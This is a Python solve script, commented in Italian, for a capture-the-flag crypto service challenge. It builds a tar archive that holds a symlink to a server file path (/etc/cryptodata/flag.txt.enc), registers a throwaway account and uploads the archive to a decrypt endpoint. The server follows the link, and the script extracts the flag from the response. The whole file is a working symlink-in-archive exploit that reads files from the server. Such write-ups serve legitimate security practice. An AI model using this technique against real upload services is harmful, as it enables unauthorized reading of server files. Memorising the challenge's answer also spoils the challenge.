# We believe in crypto, we give people the possibility to encrypt their secrets freely!

import requests
import os
import re

# runnare da WSL o da Linux, non da Windows

try:
	os.remove("flag.txt.enc")
except FileNotFoundError:
	pass
try:
	os.remove("flag.tar")
except FileNotFoundError:
	pass

# è necessario un link simbolico perché il server non consente upload di file .enc
# creo link simbolico a /etc/cryptodata/flag.txt.enc
os.system("ln -s /etc/cryptodata/flag.txt.enc flag.txt.enc")
# creo tar con il file .enc
os.system("tar -cf flag.tar flag.txt.enc")

url = "http://cryptoservice.challs.olicyber.it/"
regex = r"ptm\{.*?\}"

s = requests.Session()
# registro utente a caso
username = os.urandom(8).hex()
password = os.urandom(8).hex()
s.post(url + "register", data={"username": username, "password": password})

# invio file tar autenticato
r = s.post(url + "oracle/decrypt", files={"file": ("flag.tar", open("flag.tar", "rb"), "application/x-tar")})
flag = r.text
# cerco flag nel testo di risposta
matches = re.findall(regex, flag)
if matches:
	print(f"Flag: {matches[0]}")
else:
	print("Flag non trovata, server:")
	print(flag)